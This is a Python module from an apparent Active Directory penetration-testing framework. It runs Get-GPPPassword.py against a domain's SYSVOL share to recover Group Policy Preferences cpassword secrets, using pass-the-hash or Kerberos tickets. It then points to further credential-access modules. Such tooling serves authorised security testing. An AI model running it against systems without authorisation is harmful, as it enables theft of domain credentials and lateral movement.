import os
import shlex

from pathlib import Path

from module import BaseModule
from tool import Tool

EMPTY_LM_HASH = "aad3b435b51404eeaad3b435b51404ee"


class GPPPasswordsEnum(BaseModule):
    path = "enum/gpp_passwords"
    description = "Enumerate Group Policy Preferences cpassword secrets from SYSVOL"
    options = {
        "dc_ip": {
            "default": "",
            "description": "DC IP or host address. If blank, the domain name will be used.",
            "required": False,
        },
        "domain": {
            "default": "",
            "description": "Auth: Domain name (FQDN)",
            "required": True,
        },
        "username": {"default": "", "description": "Auth: Username", "required": True},
        "password": {
            "default": "",
            "description": "Auth: Password or NT Hash (for NTLM auth only)",
            "required": False,
        },
        "auth": {
            "default": "ntlm",
            "description": "Auth: Type (ntlm, krb)",
            "required": True,
        },
        "target": {
            "default": "",
            "description": "SMB target host (if empty, current DC host is used)",
            "required": False,
        },
        "share": {
            "default": "SYSVOL",
            "description": "SMB share to search for policy XML files",
            "required": False,
        },
        "base_dir": {
            "default": "/",
            "description": "Base directory inside the share to recursively inspect",
            "required": False,
        },
        "xmlfile": {
            "default": "",
            "description": "Optional local XML file to parse instead of SMB search",
            "required": False,
        },
        "debug": {
            "default": "No",
            "description": "Enable verbose debug output from helper script",
            "required": False,
            "boolean": True,
        },
    }

    def __init__(self, registry, job_manager):
        super().__init__(registry, job_manager)

    async def run(self):
        if not self.validate_options():
            return

        os.chdir(self.logs_dir)

        tool = Tool(self)
        tool.set_output_pane(self.pane_b)
        if not tool.set_auth(from_module=True):
            return

        offline_xml_mode = bool(self.opts.xmlfile)
        target_host = self.opts.target or self.opts.dc_hostname or self.opts.dc_ip
        if not offline_xml_mode and not target_host:
            self.pane_a.write("[red][!] Unable to determine SMB target host.[/red]")
            return

        command_parts = ["../tools/.bin/Get-GPPPassword.py"]

        if offline_xml_mode:
            command_parts += ["-xmlfile", self.opts.xmlfile]
        else:
            if self.opts.share:
                command_parts += ["-share", self.opts.share]
            if self.opts.base_dir:
                command_parts += ["-base-dir", self.opts.base_dir]

        if self.opts.dc_ip:
            command_parts += ["-dc-ip", self.opts.dc_ip]
            if target_host != self.opts.dc_ip:
                command_parts += ["-target-ip", self.opts.dc_ip]

        if self.opts.debug == "Yes":
            command_parts.append("-debug")

        if offline_xml_mode:
            target = "LOCAL"
        elif self.opts.auth == "ntlm":
            if self.is_nt_hash(self.opts.password):
                nthash = self.opts.password.strip(":")
                command_parts += ["-hashes", f"{EMPTY_LM_HASH}:{nthash}"]
                target = f"{self.opts.domain}/{self.opts.username}@{target_host}"
            else:
                target = f"{self.opts.domain}/{self.opts.username}:{self.opts.password}@{target_host}"
        else:
            ticket_path = Path(self.logs_dir) / f"{self.opts.username.lower()}.ccache"
            if not ticket_path.exists():
                self.pane_a.write(
                    f"[red][!] Kerberos ticket not found: {ticket_path.name}. Obtain one with kerberos/tgt first.[/red]"
                )
                return

            self.env["KRB5CCNAME"] = str(ticket_path)
            command_parts += ["-k", "-no-pass"]
            target = f"{self.opts.domain}/{self.opts.username}@{target_host}"

        command_parts.append(target)

        findings = 0
        lines = []

        async for line in self.run_command(shlex.join(command_parts), self.pane_b):
            lower = line.lower()
            if "cpassword" in lower or lower.strip().startswith("password:"):
                line = f"[yellow]{line}[/yellow]"
                findings += 1
            self.pane_b.write(line)
            lines.append(line)

        output = "\n".join(lines)
        log_path = self.write_unique_log(output, f"gpp_passwords_{self.opts.domain}")
        if log_path:
            self.pane_a.write(f"✓ Saved GPP enumeration output to `{log_path.name}`")

        if findings:
            self.pane_a.write(
                f"[yellow]✓ Matched {findings} GPP password-related output line(s).[/yellow]"
            )
            self.pane_a.write(
                "[cyan]Tip:[/cyan] Next, validate recovered credentials against high-value paths with `enum/privileged` and `kerberos/targets`."
            )
        else:
            self.pane_a.write(
                "[green]✓ No cpassword/password lines matched from parsed output.[/green]"
            )
            self.pane_a.write(
                "[cyan]Tip:[/cyan] No GPP secrets were parsed. Next, try `enum/laps` and `enum/acl` for alternate credential-access paths."
            )
